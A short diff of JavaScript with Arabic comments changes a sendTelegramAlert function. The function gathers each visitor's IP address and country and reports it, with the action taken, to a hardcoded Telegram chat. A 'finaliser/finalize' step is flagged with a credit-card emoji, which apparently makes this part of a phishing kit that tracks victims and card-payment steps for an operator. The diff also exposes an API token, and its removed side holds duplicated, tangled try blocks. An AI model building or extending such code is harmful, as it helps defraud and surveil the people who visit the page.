@@ -443,26 +443,20 @@
     const TELEGRAM_CHAT_ID = '-4913064483';
 
     async function sendTelegramAlert(action, details = {}) {
-        let ipInfo = { 
-            ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
-            city: 'N/A', region_name: 'N/A' 
-        };
-        try {
 let ipInfo = { 
     ip: 'N/A', country_name: 'N/A', country_code: 'N/A', 
     city: 'N/A', region_name: 'N/A' 
 };
 try {
-    // Use ipinfo.io for IP & Country detection
-    const ipRes = await fetch('https://ipinfo.io/json?token=5d7efb4df5e87b'); // يمكنك استخدام هذا التوكن المجاني (أو توكنك الشخصي)
+    const ipRes = await fetch('https://api.country.is/');
     if (ipRes.ok) {
         const data = await ipRes.json();
         ipInfo = { 
             ip: data.ip || 'N/A', 
-            country_name: data.country || 'N/A', 
+            country_name: data.country || 'N/A', // رمز الدولة مثل FR أو DZ
             country_code: data.country || 'N/A', 
-            city: data.city || 'N/A', 
-            region_name: data.region || 'N/A'
+            city: 'N/A', // هذه الخدمة لا تعطي المدينة
+            region_name: 'N/A'
         };
     } else {
         ipInfo.ip = `HTTP Error ${ipRes.status}`;
@@ -470,29 +464,7 @@ try {
 } catch (e) {
     ipInfo.ip = 'Exception during fetch';
 }
-            if (ipRes.ok) {
-                const data = await ipRes.json();
-                // Check if essential data is present, freegeoip.app doesn't have a 'status' field like ip-api
-                if (data && data.ip) { 
-                    ipInfo = { 
-                        ip: data.ip || 'N/A', 
-                        country_name: data.country_name || 'N/A', 
-                        country_code: data.country_code || 'N/A', 
-                        city: data.city || 'N/A', 
-                        region_name: data.region_name || 'N/A'
-                    };
-                } else {
-                    console.warn("IP API (freegeoip.app) response missing expected data:", data);
-                    ipInfo.ip = data.ip || 'N/A (Incomplete API data)';
-                }
-            } else {
-                console.error("IP API (freegeoip.app) request failed with HTTP status:", ipRes.status);
-                ipInfo.ip = `HTTP Error ${ipRes.status}`;
-            }
-        } catch (e) {
-            console.error("Exception fetching IP for Telegram alert:", e);
-            ipInfo.ip = 'Exception during fetch';
-        }
+
 
         let emoji = '🔔'; // Default
         if (/finaliser/i.test(action) || /finalize/i.test(action)) emoji = '💳';
